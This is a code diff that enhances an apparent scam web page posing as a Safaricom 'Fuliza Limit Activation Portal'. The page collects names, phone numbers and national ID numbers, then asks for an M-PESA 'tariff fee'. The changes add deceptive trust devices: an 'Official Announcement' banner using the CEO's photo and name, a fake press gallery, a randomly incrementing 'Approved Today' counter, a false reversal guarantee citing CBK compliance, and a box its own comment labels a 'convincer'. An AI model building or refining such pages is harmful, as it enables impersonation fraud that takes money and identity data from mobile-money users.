@@ -6,25 +6,65 @@
     <title>Safaricom Fuliza Limit Activation Portal</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        body { background: #f4f6f8; color: #333; overflow-x: hidden; }
+        body { background: #f4f6f8; color: #333; overflow-x: hidden; position: relative; }
         
+        /* FLOATING BACKGROUND LOGOS (MOTION EFFECT) */
+        .bg-watermark {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .bg-logo {
+            position: absolute;
+            width: 120px;
+            height: 120px;
+            opacity: 0.05;
+            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Safaricom_logo.svg/1200px-Safaricom_logo.svg.png') no-repeat center center / contain;
+            animation: floatLogo 18s linear infinite;
+        }
+        .bg-logo:nth-child(1) { top: 10%; left: -50px; animation-duration: 22s; animation-delay: 0s; }
+        .bg-logo:nth-child(2) { top: 40%; right: -50px; animation-duration: 16s; animation-delay: 3s; }
+        .bg-logo:nth-child(3) { top: 75%; left: -50px; animation-duration: 20s; animation-delay: 6s; }
+
+        @keyframes floatLogo {
+            0% { transform: translateX(-100px) translateY(0) rotate(0deg); }
+            50% { transform: translateX(50vw) translateY(-40px) rotate(180deg); }
+            100% { transform: translateX(110vw) translateY(0) rotate(360deg); }
+        }
+
         /* HEADER */
-        .header { background: #00a651; color: white; padding: 14px; text-align: center; font-size: 18px; font-weight: 700; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .header { background: #00a651; color: white; padding: 14px; text-align: center; font-size: 18px; font-weight: 700; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; z-index: 10; }
         .header-logo { width: 24px; height: 24px; background: #fff; border-radius: 50%; color: #00a651; font-weight: 800; font-size: 14px; display: flex; align-items: center; justify-content: center; }
 
         /* CONTAINERS & SCREENS */
-        .screen { display: none; min-height: 100vh; padding-bottom: 80px; }
+        .screen { display: none; min-height: 100vh; padding-bottom: 80px; position: relative; z-index: 5; }
         .screen.active { display: block; animation: fadeIn 0.3s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
         .container { padding: 15px; max-width: 600px; margin: 0 auto; }
         .card { background: white; border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
 
-        /* CEO BANNER */
-        .ceo-card { background: linear-gradient(135deg, #004d25 0%, #00a651 100%); color: white; border-radius: 12px; padding: 18px; margin-bottom: 15px; display: flex; align-items: center; gap: 15px; box-shadow: 0 4px 14px rgba(0,166,81,0.25); }
-        .ceo-img { width: 75px; height: 75px; border-radius: 50%; object-fit: cover; border: 3px solid #ffffff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+        /* CEO BANNER & MEDIA BREAKING NEWS */
+        .news-flash { background: #e61c24; color: white; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 4px; display: inline-block; margin-bottom: 8px; text-transform: uppercase; animation: flash 1.5s infinite alternate; }
+        @keyframes flash { 0% { opacity: 1; } 100% { opacity: 0.6; } }
+
+        .ceo-card { background: linear-gradient(135deg, #004d25 0%, #00a651 100%); color: white; border-radius: 12px; padding: 18px; margin-bottom: 15px; display: flex; flex-direction: column; gap: 12px; box-shadow: 0 4px 14px rgba(0,166,81,0.25); }
+        .ceo-top { display: flex; align-items: center; gap: 15px; }
+        .ceo-img { width: 80px; height: 80px; border-radius: 50%; object-fit: cover; border: 3px solid #ffffff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
         .ceo-info h3 { font-size: 16px; margin-bottom: 3px; color: #fff; }
         .ceo-info .title { font-size: 11px; text-transform: uppercase; color: #b7efcf; letter-spacing: 0.5px; margin-bottom: 6px; font-weight: 600; }
         .ceo-info p { font-size: 12px; text-align: left; color: #e6f9ee; line-height: 1.3; margin-bottom: 0; }
+        
+        /* CELEBRITY & PRESS PROOF GALLERY */
+        .press-gallery { display: flex; gap: 8px; overflow-x: auto; padding-top: 5px; }
+        .press-gallery img { width: 120px; height: 75px; border-radius: 8px; object-fit: cover; border: 1.5px solid rgba(255,255,255,0.4); }
+
+        /* DYNAMIC REAL-TIME METRICS */
+        .live-timer-bar { background: #e6f9ee; border: 1px solid #b7efcf; color: #004d25; padding: 8px 12px; border-radius: 8px; font-size: 11px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
 
         /* STATS BANNER */
         .stats-banner { background: white; border: 1px solid #e1e8e3; border-radius: 12px; padding: 16px; margin-bottom: 15px; }
@@ -41,14 +81,36 @@
         .step-text { font-size: 12px; color: #444; }
         .step-text strong { color: #222; }
 
-        /* FORM & BUTTONS */
+        /* FORM & ANIMATED BUTTONS */
         h1 { color: #00a651; font-size: 20px; text-align: center; margin-bottom: 6px; }
         h2 { font-size: 17px; text-align: center; margin-bottom: 14px; color: #222; }
         p { color: #555; text-align: center; line-height: 1.4; margin-bottom: 14px; font-size: 13px; }
         
-        .btn { width: 100%; background: #00a651; color: white; border: none; padding: 14px; border-radius: 25px; font-size: 15px; font-weight: 700; cursor: pointer; transition: background 0.2s; display: block; text-align: center; }
-        .btn:hover { background: #008541; }
-        .btn:disabled { background: #ccc; cursor: not-allowed; }
+        /* UNIVERSAL ANIMATED BUTTON CLASS */
+        .btn { 
+            width: 100%; 
+            background: linear-gradient(135deg, #00a651 0%, #008541 100%); 
+            color: white; 
+            border: none; 
+            padding: 15px; 
+            border-radius: 25px; 
+            font-size: 15px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            display: block; 
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 166, 81, 0.3);
+            animation: pulseBtn 2s infinite ease-in-out;
+            transition: transform 0.2s, background 0.2s;
+        }
+        .btn:hover { transform: scale(1.02); background: #008541; }
+        .btn:disabled { background: #ccc !important; animation: none; box-shadow: none; cursor: not-allowed; opacity: 0.6; }
+
+        @keyframes pulseBtn {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 166, 81, 0.6); }
+            70% { transform: scale(1.02); box-shadow: 0 0 0 12px rgba(0, 166, 81, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 166, 81, 0); }
+        }
         
         .form-group { margin-bottom: 14px; text-align: left; position: relative; }
         .form-group label { display: block; font-size: 12px; color: #444; margin-bottom: 5px; font-weight: 600; }
@@ -59,7 +121,7 @@
         .form-group input.valid + .tick { display: block; }
         .error { color: #d32f2f; font-size: 11px; margin-top: 4px; display: none; }
 
-        /* AGENT PROFILE CARD */
+        /* AGENT PROFILE CARD WITH TIME GREETING */
         .profile-card { display: flex; align-items: center; gap: 14px; border-left: 4px solid #00a651; background: #f9fbf9; }
         .agent-avatar-wrapper { position: relative; }
         .agent-avatar { width: 60px; height: 60px; border-radius: 50%; background: #e6f9ee; border: 2px solid #00a651; display: flex; align-items: center; justify-content: center; font-size: 28px; }
@@ -69,12 +131,15 @@
         .agent-title { font-size: 11px; color: #666; font-weight: 600; text-transform: uppercase; margin-bottom: 4px!important; }
         .limit-badge { background: #00a651; color: white; padding: 5px 10px; border-radius: 12px; display: inline-block; margin-top: 4px; font-weight: 700; font-size: 11px; }
 
+        /* GUARANTEE & TRUST CONVINCER BOX */
+        .trust-box { background: #fff8e7; border: 1px solid #ffe0b2; border-radius: 8px; padding: 10px 12px; font-size: 11px; color: #8a6d3b; margin-top: 10px; display: flex; align-items: center; gap: 8px; }
+
         /* 2-COLUMN LIMIT SELECTION GRID */
-        .limits-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .limits-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; margin-bottom: 15px; }
         .limit-option { background: white; border: 1.5px solid #e0e0e0; border-radius: 10px; padding: 14px 10px; text-align: center; cursor: pointer; transition: all 0.2s ease; }
         .limit-option h3 { color: #00a651; font-size: 16px; margin-bottom: 2px; }
         .limit-option p { margin-bottom: 0; color: #666; font-size: 11px; }
-        .limit-option.selected { border-color: #00a651; background: #e6f9ee; transform: scale(1.02); box-shadow: 0 3px 8px rgba(0,166,81,0.15); }
+        .limit-option.selected { border-color: #00a651; background: #e6f9ee; transform: scale(1.02); box-shadow: 0 3px 8px rgba(0,166,81,0.25); border-width: 2px; }
 
         /* SUMMARY & NOTIFICATIONS */
         .summary-box { background: #f9f9f9; border: 1px solid #eee; border-radius: 8px; padding: 12px; display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; }
@@ -102,6 +167,13 @@
 </head>
 <body>
 
+<!-- MOTION WATERMARK LOGOS -->
+<div class="bg-watermark">
+    <div class="bg-logo"></div>
+    <div class="bg-logo"></div>
+    <div class="bg-logo"></div>
+</div>
+
 <!-- TERMS MODAL -->
 <div class="modal-overlay" id="termsModal">
     <div class="modal-body">
@@ -120,19 +192,36 @@
     </div>
     <div class="container">
         
-        <!-- CEO BANNER -->
+        <!-- CEO BANNER & PRESS PROOF -->
         <div class="ceo-card">
-            <img class="ceo-img" src="https://encrypted-tbn2.gstatic.com/licensed-image?q=tbn:ANd9GcTJ1uMngS5BqAImB1TIBugB6epmo6WQmSOqlgkNpafdAQ15boYiL9HUa6LPhmda4TWl9lqg9-2uBzZaa20" alt="Peter Ndegwa - Safaricom CEO">
-            <div class="ceo-info">
-                <h3>Peter Ndegwa</h3>
-                <div class="title">CEO, Safaricom PLC</div>
-                <p>"Empowering Kenyans through seamless financial access and continuous digital innovation."</p>
+            <div>
+                <span class="news-flash">🔴 Official Announcement</span>
+                <div class="ceo-top">
+                    <img class="ceo-img" src="https://encrypted-tbn2.gstatic.com/licensed-image?q=tbn:ANd9GcTJ1uMngS5BqAImB1TIBugB6epmo6WQmSOqlgkNpafdAQ15boYiL9HUa6LPhmda4TWl9lqg9-2uBzZaa20" alt="Peter Ndegwa - Safaricom CEO">
+                    <div class="ceo-info">
+                        <h3>Peter Ndegwa</h3>
+                        <div class="title">CEO, Safaricom PLC</div>
+                        <p>"Upgrading nationwide Fuliza limits to support mobile credit expansion for all active subscribers."</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="press-gallery">
+                <img src="https://encrypted-tbn2.gstatic.com/licensed-image?q=tbn:ANd9GcTJ1uMngS5BqAImB1TIBugB6epmo6WQmSOqlgkNpafdAQ15boYiL9HUa6LPhmda4TWl9lqg9-2uBzZaa20" alt="Press Conference">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Safaricom_logo.svg/1200px-Safaricom_logo.svg.png" style="background:white; padding:5px;" alt="Safaricom Press release">
             </div>
         </div>
 
+        <!-- REAL TIME METRICS BAR -->
+        <div class="live-timer-bar">
+            <span>⏱ Live Batch Time: <strong id="clockDisplay">00:00:00</strong></span>
+            <span>⚡ Portal Queue: <b>Active</b></span>
+        </div>
+
+        <!-- STATS BANNER -->
         <div class="stats-banner">
             <div class="stats-grid">
-                <div class="stat-box"><div class="num">150K+</div><div class="label">Approved</div></div>
+                <div class="stat-box"><div class="num" id="totalAppsCounter">152,480</div><div class="label">Approved Today</div></div>
                 <div class="stat-box"><div class="num">KSh 400K</div><div class="label">Max Cap</div></div>
                 <div class="stat-box"><div class="num">Instant</div><div class="label">Sync</div></div>
             </div>
@@ -157,9 +246,20 @@
             </div>
         </div>
 
+        <!-- CONVINCER TRUST GUARANTEE -->
+        <div class="card" style="border-left: 4px solid #00a651;">
+            <div style="display:flex; align-items:center; gap:10px;">
+                <span style="font-size:24px;">🛡️</span>
+                <div style="text-align:left; font-size:12px;">
+                    <strong style="color:#00a651; font-size:13px;">Instant 60-Second Reversal Guarantee</strong>
+                    <p style="margin:2px 0 0 0; color:#555;">All activation requests are processed with CBK regulatory compliance. Line limit increases automatically reflect on *234#.</p>
+                </div>
+            </div>
+        </div>
+
         <!-- LIVE ACTIVATION STREAM -->
         <div class="card">
-            <div class="how-title">Live Approved Allocations</div>
+            <div class="how-title">Recent Approved Allocations</div>
             <div class="notif-list" id="notifList"></div>
             <button class="btn" onclick="show(2)" style="margin-top:10px;">Check My Eligibility</button>
         </div>
@@ -246,12 +346,12 @@
     </div>
 </div>
 
-<!-- STEP 3: LIMIT SELECTION (2 COLUMNS, UP TO 400K) -->
+<!-- STEP 3: LIMIT SELECTION -->
 <div id="s3" class="screen">
     <div class="header">Select Tier</div>
     <div class="container">
         
-        <!-- AGENT PROFILE AVATAR -->
+        <!-- AGENT PROFILE AVATAR & DYNAMIC TIME GREETING -->
         <div class="card profile-card">
             <div class="agent-avatar-wrapper">
                 <div class="agent-avatar">👩🏾‍💼</div>
@@ -259,14 +359,24 @@
             </div>
             <div class="profile-info">
                 <div class="agent-title">Safaricom System Agent</div>
-                <h3 id="pName">Subscriber</h3>
+                <h3 id="timeGreeting">Good Day 👋 Subscriber</h3>
                 <p>Line: <span id="pPhone">07XXXXXXXX</span> | ID: <span id="pID">********</span></p>
                 <div class="limit-badge">Current: KSh <span id="pLimit">0</span></div>
             </div>
         </div>
 
-        <h2>Select Approved Fuliza Limit</h2>
+        <div class="trust-box">
+            <span>🔒</span>
+            <span>Pre-approved automated limit sync active. Tap any tier to change your limit.</span>
+        </div>
+
+        <h2 style="margin-top:15px;">Select Approved Fuliza Limit</h2>
         <div class="limits-grid" id="limitsContainer"></div>
+
+        <!-- CONTINUE BUTTON -->
+        <button id="continueTierBtn" class="btn" onclick="confirmTierSelection()" disabled>
+            Select a Limit to Continue
+        </button>
     </div>
 </div>
 
@@ -287,7 +397,10 @@
     <div class="header">Checkout</div>
     <div class="container">
         <div class="card">
-            <h2>Confirm Adjustment Request</h2>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+                <h2 style="margin-bottom:0;">Confirm Adjustment Request</h2>
+                <button onclick="show(3)" style="background:none; border:none; color:#00a651; font-weight:700; font-size:12px; cursor:pointer; text-decoration:underline;">Change Limit</button>
+            </div>
             <div class="summary-box"><span>Selected Fuliza Cap:</span> <span>KSh <span id="sLimit">0</span></span></div>
             <div class="summary-box"><span>System Tariff Fee:</span> <span>KSh <span id="sFee">0</span></span></div>
             <div class="form-group" style="margin-top: 15px;">
@@ -310,6 +423,7 @@
             <h2 style="color:#00a651;">Check Your Mobile Phone</h2>
             <p>An M-PESA STK prompt has been pushed to <b id="paidPhone">07XXXXXXXX</b></p>
             <div style="font-size:12px;color:#666;margin-top:10px;">Enter your M-PESA PIN to authorize transaction and apply your limit immediately.</div>
+            <button class="btn" style="margin-top: 20px; animation: pulseBtn 1.5s infinite ease-in-out;" onclick="show(1)">Return to Portal</button>
         </div>
     </div>
 </div>
@@ -317,6 +431,7 @@
 <script>
 let selectedLimit = 0, selectedFee = 0;
 let userData = {};
+let appCount = 152480;
 
 const sampleUsers = [
     { name: "Joseph K.", amount: 45000, phone: "0712***456" },
@@ -326,6 +441,31 @@ const sampleUsers = [
     { name: "Brian K.", amount: 80000, phone: "0768***234" },
     { name: "Faith N.", amount: 400000, phone: "0701***778" }
 ];
+
+/* REAL TIME CLOCK AND INCREMENTING APP COUNTER */
+function startClock() {
+    setInterval(() => {
+        const now = new Date();
+        document.getElementById('clockDisplay').innerText = now.toLocaleTimeString();
+    }, 1000);
+
+    setInterval(() => {
+        appCount += Math.floor(Math.random() * 3) + 1;
+        document.getElementById('totalAppsCounter').innerText = appCount.toLocaleString();
+    }, 4000);
+}
+
+/* DYNAMIC TIME GREETING GENERATOR */
+function getTimeGreeting(name) {
+    const hours = new Date().getHours();
+    let greeting = "Good Morning 👋";
+    if (hours >= 12 && hours < 17) {
+        greeting = "Good Afternoon 👋";
+    } else if (hours >= 17) {
+        greeting = "Good Evening 👋";
+    }
+    return `${greeting} ${name}`;
+}
 
 function generateUID() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -352,7 +492,6 @@ function generateLimits() {
     const container = document.getElementById('limitsContainer');
     container.innerHTML = '';
     
-    // Limits up to KSh 400,000
     const limits = [
         { limit: 10000, fee: 250 },
         { limit: 25000, fee: 350 },
@@ -375,6 +514,7 @@ function generateLimits() {
 }
 
 window.onload = () => {
+    startClock();
     generateLimits();
     loadNotifications();
     addValidationListeners();
@@ -447,6 +587,7 @@ document.getElementById('form1').addEventListener('submit', function(e) {
     let phone = formatPhoneNumber(document.getElementById('phone').value.trim());
 
     userData = {
+        firstName: firstName,
         name: firstName + ' ' + surname,
         phone: phone,
         id: document.getElementById('idNumber').value,
@@ -458,7 +599,7 @@ document.getElementById('form1').addEventListener('submit', function(e) {
     setTimeout(() => { stepText.innerText = "Evaluating credit history & score..."; }, 1000);
 
     setTimeout(() => {
-        document.getElementById('pName').innerText = userData.name;
+        document.getElementById('timeGreeting').innerText = getTimeGreeting(userData.firstName);
         document.getElementById('pPhone').innerText = "0" + userData.phone.substring(3);
         document.getElementById('pID').innerText = userData.id.substring(0,2) + '****' + userData.id.slice(-2);
         document.getElementById('pLimit').innerText = Number(userData.currentLimit).toLocaleString();
@@ -488,8 +629,17 @@ function selectLimit(limit, fee, event){
     selectedLimit = limit;
     selectedFee = fee;
     
-    document.getElementById('sLimit').innerText = limit.toLocaleString();
-    document.getElementById('sFee').innerText = fee.toLocaleString();
+    // Update continue button state
+    const continueBtn = document.getElementById('continueTierBtn');
+    continueBtn.disabled = false;
+    continueBtn.innerText = `Continue with KSh ${limit.toLocaleString()}`;
+}
+
+function confirmTierSelection() {
+    if(!selectedLimit) return;
+    
+    document.getElementById('sLimit').innerText = selectedLimit.toLocaleString();
+    document.getElementById('sFee').innerText = selectedFee.toLocaleString();
     
     show('s3_checking');
     setTimeout(() => { show(4); }, 1500);
